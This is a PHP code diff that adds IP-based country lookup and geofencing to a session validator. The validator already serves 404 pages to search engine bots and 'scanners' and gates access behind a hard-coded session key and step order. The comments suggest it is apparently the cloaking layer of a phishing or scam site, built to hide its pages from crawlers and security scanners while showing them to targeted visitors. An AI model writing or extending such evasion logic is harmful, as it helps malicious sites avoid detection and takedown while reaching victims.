@@ -48,6 +48,57 @@ function checkSearchEngineBot()
 }
 
 /**
+ * Get visitor's country from IP geolocation
+ */
+function getCountryFromIP() {
+    global $allowed_countries;
+
+    // Get IP address
+    $ip = '';
+    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
+        if (!empty($_SERVER[$k])) {
+            $ip = trim(explode(',', $_SERVER[$k])[0]);
+            break;
+        }
+    }
+
+    if (!$ip || $ip === 'N/A') return null;
+
+    // Use ip-api.com for geolocation (free tier: 45 requests/min)
+    $url = "http://ip-api.com/json/$ip?fields=countryCode";
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+
+    return null;
+}
+
+/**
+ * Check if visitor is from allowed country
+ */
+function checkCountryRestriction() {
+    global $allowed_countries;
+
+    $country = getCountryFromIP();
+
+    // If we can't determine country, allow (fail open - better UX than blocking)
+    if (!$country) return true;
+
+    // Check if country is in allowed list
+    return in_array($country, $allowed_countries);
+}
+
+/**
  * Validate session chain.
  */
 function validateSession($min_step = 1)
@@ -61,12 +112,17 @@ function validateSession($min_step = 1)
     // 1. Search bots: Must see a 404 to stay safe
     checkSearchEngineBot();
 
-    // 2. Keymaster session check: Shows professional 404 for users/scanners
+    // 2. Country check: Block if not from allowed countries
+    if (!checkCountryRestriction()) {
+        showClean404();
+    }
+
+    // 3. Keymaster session check: Shows professional 404 for users/scanners
     if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
         showClean404();
     }
 
-    // 3. Chain order check: Shows 404 if accessed out of order
+    // 4. Chain order check: Shows 404 if accessed out of order
     if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < $min_step) {
         showClean404();
     }
